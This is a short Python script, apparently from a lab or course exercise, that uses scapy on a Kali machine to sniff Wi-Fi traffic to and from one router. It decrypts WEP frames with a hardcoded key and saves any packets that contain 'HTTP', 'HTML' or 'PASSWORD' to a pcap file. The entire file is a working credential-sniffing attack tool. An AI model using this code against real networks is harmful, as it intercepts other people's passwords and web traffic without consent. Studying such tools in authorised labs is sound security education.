from scapy.all import * # import all functions from the scapy library
from decrypt import decryptWEP # import decryptWEP function from decrypt.py

# Define necessary variables
package_list = PcapWriter("/home/kali/Desktop/WEPpackets.pcap", append = True, sync = True) # Directory to store filtered packages
router_MAC= "74:da:38:eb:6f:dc" 
WEP_key = "ESAT2"
network_interface = "wlan1" #"wlan0"

def decryptAndFilter(p):

	# Filter for WEP packages
	if p.haslayer(Dot11WEP): 
		dp = decryptWEP(p,WEP_key) # decrypt the WEP package

		# Filter for packets containing "HTTP", "HTML" or "PASSWORD" in their data
		if "HTTP" in str(dp) or "HTML" in str(dp).upper() or "PASSWORD" in str(dp).upper():
			package_list.write(p) # Store the package to the package list
			print("\n"+20*"-"+"\n") # Write a line to separate packages visually in the printed output
			return dp # return the decrypted package

# Let the user know the sniffer has started successfully		
print("Sniffing started...")

# Sniff will gather the packages it sniffs on the network_interface, it automaticaaly filters for packages sent or received by the targetted router
# it will print the packages that are outputted by decryptAndFilter and it won't store any packages in the device's RAM
sniff(iface=network_interface, filter="ether src "+router_MAC+" or ether dst "+router_MAC, prn=decryptAndFilter, store=0)

